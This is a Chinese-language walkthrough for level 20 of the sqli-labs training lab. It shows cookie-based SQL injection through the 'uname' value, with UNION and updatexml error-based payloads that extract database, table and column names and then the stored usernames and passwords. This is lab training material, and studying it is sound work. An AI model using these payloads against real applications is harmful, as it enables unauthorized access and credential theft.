---
title: Less - 20
date: 2023-03-15T13:20:13Z
lastmod: 2023-03-15T13:41:53Z
---

# Less - 20

---

# 通关教程

---

## 1、判断闭合

---

返回了输入的name和password，并提示使用cookie

​![image](assets/image-20230315132609-n9sm5u3.png)​

修改cookie的值如下

```html
uname=admin'#
```

​![image](assets/image-20230315132921-ezaql4j.png)​

回显位置如下

​![image](assets/image-20230315133352-ma0tgj4.png)​

---

## 2、查看当前数据库

---

```html
uname=' union select database(),2,3#
```

​![image](assets/image-20230315133446-0rit721.png)​

---

## 3、查看数据库名

---

```html
 uname=' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata limit 0,1),0x7e),1)#
```

​![image](assets/image-20230315133539-4t1pmqb.png)​

---

## 4、查看数据表名

---

```html
uname=' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)#
```

​![image](assets/image-20230315133813-vyeqqrb.png)​

---

## 5、查看字段名

---

```html
uname=' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e),1)#
```

​![image](assets/image-20230315133956-yq6ovbo.png)​

---

## 6、查看字段值

---

```html
 uname=' and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users  limit 0,1),0x7e),1)#
```

​![image](assets/image-20230315134142-v4jjlql.png)​

‍
